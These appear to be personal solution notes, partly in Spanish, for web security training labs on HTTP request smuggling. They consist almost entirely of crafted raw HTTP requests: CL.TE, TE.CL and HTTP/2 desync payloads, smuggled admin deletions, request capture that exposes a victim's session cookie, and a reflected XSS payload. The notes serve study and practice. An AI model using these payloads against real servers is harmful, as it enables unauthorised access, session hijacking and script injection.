## Lab: HTTP request smuggling, basic CL.TE vulnerability

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Transfer-Encoding: chunked
\r\n
0\r\n
\r\n
GPOST
```

## Lab: HTTP request smuggling, basic TE.CL vulnerability

```
POST / HTTP/1.1
Host: 0a75004a038b7f7780ce9e6200680069.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
Transfer-Encoding: chunked
\r\n
56\r\n
GPOST / HTTP/1.1\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 5\r\n
\r\n
0\r\n
\r\n
```
## Lab: HTTP request smuggling, obfuscating the TE header

```
POST / HTTP/1.1
Host: 0a7e000d04299a888104a3e5002200e0.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
Transfer-Encoding: chunked
Transfer-Encoding: foobar
\r\n
56\r\n
GPOST / HTTP/1.1\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 6\r\n
\r\n
0\r\n
\r\n
```

## Lab: HTTP request smuggling, confirming a CL.TE vulnerability via differential responses

```
POST / HTTP/1.1
Host: 0a84006803db42088641edc200ff003f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Transfer-Encoding: chunked
\r\n
1\r\n
a\r\n
0\r\n
\r\n
GET /404 HTTP/1.1\r\n
foo: x\r\n
```

## Lab: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses

```
POST / HTTP/1.1
Host: 0adc00f20419fe74841781fe00230073.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
\r\n
5b\r\n
GET /andres HTTP/1.1\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 11\r\n
\r\n
0\r\n
\r\n
```

## Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability

```
POST / HTTP/1.1
Host: 0a3f003f039542d5871e1fc900f500b8.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 89
Transfer-Encoding: chunked
\r\n
0\r\n
\r\n
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Length: 10

x
```

## Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability

```
POST / HTTP/1.1
Host: 0a680060036da186814f66cd00c80032.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
\r\n
50\r\n
GET /admin/delete?username=carlos HTTP/1.1\r\n
Host: localhost\r\n
Content-Length: 6\r\n
\r\n
0\r\n
\r\n
```

## Lab: Exploiting HTTP request smuggling to reveal front-end request rewriting

Primera parte -> obtener headers que envia el front al back 
```
POST / HTTP/1.1
Host: 0aca008903738f6e823f6ad900d1004f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 166
Transfer-Encoding: chunked
\r\n
0\r\n
\r\n
POST / HTTP/1.1\r\n
Host: 0aca008903738f6e823f6ad900d1004f.web-security-academy.net\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 100\r\n
\r\n
search=
```

Segunda parte
```
POST / HTTP/1.1
Host: 0aca008903738f6e823f6ad900d1004f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 210
Transfer-Encoding: chunked
\r\n
0\r\n
\r\n
GET /admin/delete?username=carlos HTTP/1.1\r\n
X-OlFqbz-Ip: 127.0.0.1\r\n
Host: 0aca008903738f6e823f6ad900d1004f.web-security-academy.net\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 100\r\n
\r\n
```

## Lab: Exploiting HTTP request smuggling to capture other users' requests

Primer request -> esperar que el admin envie una request
```
POST / HTTP/1.1
Host: 0a2900ad048d5dba801f307e005a00a0.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 340
Transfer-Encoding: chunked
\r\n
0\r\n
\r\n
POST /post/comment HTTP/1.1
Host: 0a2900ad048d5dba801f307e005a00a0.web-security-academy.net
Cookie: session=qPpOjlK5VYACU4FlQR0UjPQNZMQKyTX0
Content-Type: application/x-www-form-urlencoded
Content-Length: 950

csrf=zqxvypnO4MDDrP6WZ4p7BZ0eERKWHLER&postId=9&name=test&email=test%40test.com&website=https%3A%2F%2Flasdfg&comment=VIC
```

Acceder a su cuenta
```
GET /my-account HTTP/1.1
Host: 0a2900ad048d5dba801f307e005a00a0.web-security-academy.net
Cookie: victim-fingerprint=J0ST9MWGpibL4C74tEUuWIAUVdWUuX0Q; ; session=baN9Oq5pMwsFYvbo4MeUvBkBTTULZHFt; secret=UM2MZM52vApOS5LCC2XjoiEBC0O29IO7 
user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Content-Length: 0
```

## Lab: Exploiting HTTP request smuggling to deliver reflected XSS

```
POST / HTTP/1.1
Host: 0ad7000f0417504a806a122000270000.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 165
Transfer-Encoding: chunked
\r\n
0\r\n
\r\n
GET /post?postId=10 HTTP/1.1
Host: 0ad7000f0417504a806a122000270000.web-security-academy.net
User-Agent: a"><script>alert(1)</script>
Content-Length: 3

x=
```

## Lab: H2.CL request smuggling

```
POST / HTTP/2
Host: 0a8b001804d240bb81d34d88006900d7.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 5
\r\n
x=1
GET /resources/js HTTP/1.1
Host: exploit-0a1800e9048440b681a14c8801520015.exploit-server.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 3

x=
```

## Lab: Response queue poisoning via H2.TE request smuggling

```
POST /fjlkasfjlkasdjf HTTP/2
Host: 0a1a004b0472f3598060687a00ee0005.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
\r\n
0\r\n
\r\n
GET /404 HTTP/1.1\r\n
Host: 0a1a004b0472f3598060687a00ee0005.web-security-academy.net\r\n
\r\n
```

## Lab: HTTP/2 request smuggling via CRLF injection

![[Pasted image 20251120132033.png]]

## 